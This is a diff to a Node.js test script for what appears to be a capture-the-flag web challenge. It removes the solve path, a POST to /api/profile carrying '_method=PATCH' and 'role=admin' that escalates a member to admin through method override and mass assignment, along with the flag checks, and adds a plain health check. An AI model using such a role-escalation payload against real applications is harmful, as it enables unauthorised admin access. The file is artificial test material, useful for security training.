@@ -4,7 +4,6 @@ const assert = require("assert");
 
 const PORT = 3917 + Math.floor(Math.random() * 400);
 const BASE = `http://127.0.0.1:${PORT}`;
-const FLAG = process.env.FLAG || "flag{verify_method_override_mass_assignment}";
 
 function request(method, path, body = "", headers = {}) {
   return new Promise((resolve, reject) => {
@@ -43,7 +42,7 @@ async function waitForServer() {
 
 async function main() {
   const child = spawn(process.execPath, ["server.js"], {
-    env: { ...process.env, PORT: String(PORT), FLAG },
+    env: { ...process.env, PORT: String(PORT) },
     stdio: ["ignore", "pipe", "pipe"]
   });
 
@@ -59,31 +58,19 @@ async function main() {
     const blocked = await request("GET", "/admin", "", { Cookie: cookie });
     assert.strictEqual(blocked.status, 403, "regular member should not access admin");
 
-    const safeUpdate = await request(
+    const update = await request(
       "POST",
       "/api/profile",
-      "displayName=Still+Member&role=admin",
+      "displayName=Updated+Member&team=Badge+Support",
       { Cookie: cookie, Accept: "application/json" }
     );
-    assert.strictEqual(safeUpdate.status, 200, "normal profile update should succeed");
-    assert.match(safeUpdate.body, /"role": "member"/, "normal update must ignore role");
+    assert.strictEqual(update.status, 200, "profile update should succeed");
+    const updatedCookie = update.headers["set-cookie"][0].split(";")[0];
 
-    const exploit = await request(
-      "POST",
-      "/api/profile",
-      "_method=PATCH&displayName=Director+Now&role=admin",
-      { Cookie: cookie, Accept: "application/json" }
-    );
-    assert.strictEqual(exploit.status, 200, "legacy override should route to PATCH");
-    assert.match(exploit.body, /"mode": "legacy-patch"/, "legacy mode should be visible in API response");
-    assert.match(exploit.body, /"role": "admin"/, "mass assignment should update role");
-    const adminCookie = exploit.headers["set-cookie"][0].split(";")[0];
+    const stillBlocked = await request("GET", "/admin", "", { Cookie: updatedCookie });
+    assert.strictEqual(stillBlocked.status, 403, "regular member should remain blocked");
 
-    const flagPage = await request("GET", "/admin", "", { Cookie: adminCookie });
-    assert.strictEqual(flagPage.status, 200, "admin page should open after exploit");
-    assert.match(flagPage.body, new RegExp(FLAG), "flag should be visible");
-
-    console.log("Verified: method override + mass assignment solve path works.");
+    console.log("Verified: app health check passed.");
   } finally {
     child.kill();
   }
